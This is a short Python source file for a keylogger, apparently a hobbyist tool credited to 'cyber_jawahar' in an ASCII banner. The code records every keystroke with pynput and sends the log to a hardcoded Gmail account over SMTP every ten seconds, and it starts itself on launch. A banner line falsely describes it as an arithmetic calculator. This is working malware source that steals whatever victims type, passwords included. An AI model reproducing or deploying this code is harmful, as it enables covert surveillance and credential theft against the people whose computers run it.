import pynput.keyboard
import threading
import smtplib


class Keylogger:

    def __init__(self,time,email,password):  # intha use panna import panni cls define panna podum atomatic a fulla a run ahum
        self.stored_keys = "IT IS BEGIN"
        self.time=time
        self.email=email
        self.password=password

    def log(self,string):
        self.stored_keys=self.stored_keys+string

    def key_press(self,key):
        try:
            current_key= str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = self.stored_keys + " " + str(key) + " "
        self.log(current_key)

    def send_mail(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()  # tls encrpted form ku because passwd is there
        server.login(email, password)  # login
        server.sendmail(email, email, message)
        server.quit()  # logout


    def report(self):
        self.send_mail(self.email,self.password,"\n\n"+self.stored_keys)
        print(self.stored_keys)
        self.stored_keys = ""
        timer = threading.Timer(self.time, self.report)
        timer.start()


    def start(self):
        keyboard_listen = pynput.keyboard.Listener(on_press=self.key_press)
        with keyboard_listen as listener:
            self.report()
            listener.join()

print("""
   IT HAVE ADDITION,SUBTRACTION,MULTIPLICATION,DIVISION ONLY.IF YOU WANT,YOU CAN ADD WHATEVER IT MAYBE..
 ##--------------------------------------------##
 #|                                            |#
 #|        $ KEY LOGGER $                      |#
 #|                                            |
 #        [send it through mail]               |#
 #|                  BY.....                   |#
 #|                                            |#
 #|                |*| cyber_jawahar           |#
 #|                                            |#
 ##--------------------------------------------##\n
""")


my_keylogger=Keylogger(10,"anonymous02k2@gmail.com","12345@abcde")
my_keylogger.start()